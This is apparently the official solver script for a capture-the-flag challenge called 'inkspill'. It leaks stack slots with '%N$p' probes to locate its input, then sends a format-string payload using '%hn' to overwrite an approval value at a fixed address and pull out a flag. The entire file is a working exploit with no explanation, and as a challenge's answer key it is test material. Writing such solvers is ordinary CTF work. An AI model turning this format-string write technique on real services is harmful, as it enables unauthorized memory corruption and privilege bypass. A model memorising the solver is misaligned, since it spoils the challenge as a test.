#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import sys

APPROVAL = 0x405000
MAGIC = 0x0539
MAX_PROBE_INDEX = 12
REPORT_MARKER = b"AAAABBBB"
REPORT_MARKER_VALUE = 0x4242424241414141
FLAG_RE = re.compile(rb"(?:kctf\{flag\}|KCTF\{[0-9a-f]{64}\})")


class Tube:
    def __init__(self, sock):
        self.sock = sock

    def send(self, data):
        self.sock.sendall(data)

    def recv(self, size=4096):
        return self.sock.recv(size)

    def recvuntil(self, marker):
        data = bytearray()
        while marker not in data:
            chunk = self.recv()
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}: {bytes(data)!r}")
            data.extend(chunk)
        return bytes(data)

    def close(self):
        self.sock.close()


def connect(host, port):
    sock = socket.create_connection((host, port), timeout=5.0)
    sock.settimeout(5.0)
    return Tube(sock=sock)


def discover_report_index(tube):
    probe = REPORT_MARKER + b"|" + b"|".join(
        f"%{index}$p".encode() for index in range(1, MAX_PROBE_INDEX + 1)
    )
    tube.recvuntil(b"> ")
    tube.send(b"1\n")
    tube.recvuntil(b"report> ")
    tube.send(probe + b"\n")
    result = tube.recvuntil(b"> ")

    # Parse in position order directly from the delimited press line.
    press = result.split(b"[press] ", 1)[1].split(b"\n", 1)[0]
    fields = press.split(b"|")[1:]
    for index, field in enumerate(fields, 1):
        if field == f"0x{REPORT_MARKER_VALUE:x}".encode():
            return index
    raise RuntimeError(f"report stack slot was not found: {press!r}")


def build_payload(report_index):
    for argument_index in range(report_index, 33):
        prefix = f"%1${MAGIC}c%{argument_index}$hn".encode()
        address_offset = (len(prefix) + 1 + 7) & ~7
        if report_index + address_offset // 8 != argument_index:
            continue
        return (prefix + b"\0" + b"A" * (address_offset - len(prefix) - 1)
                + struct.pack("<Q", APPROVAL))
    raise ValueError("could not place the approval address in a positional slot")


def exploit(tube, report_index):
    tube.recvuntil(b"> ")
    tube.send(b"1\n")
    tube.recvuntil(b"report> ")
    tube.send(build_payload(report_index) + b"\n")
    tube.recvuntil(b"> ")
    tube.send(b"2\n")
    result = tube.recvuntil(b"> ")

    match = FLAG_RE.search(result)
    if match:
        return match.group(0).decode()
    raise RuntimeError(f"exploit did not return a flag: {result[-500:]!r}")


def main():
    parser = argparse.ArgumentParser(description="Official inkspill solver")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    probe_tube = connect(args.host, args.port)
    try:
        report_index = discover_report_index(probe_tube)
    finally:
        probe_tube.close()

    tube = connect(args.host, args.port)
    try:
        print(exploit(tube, report_index))
    finally:
        tube.close()


if __name__ == "__main__":
    try:
        main()
    except (EOFError, OSError, RuntimeError, ValueError) as error:
        print(f"[-] {error}", file=sys.stderr)
        sys.exit(1)
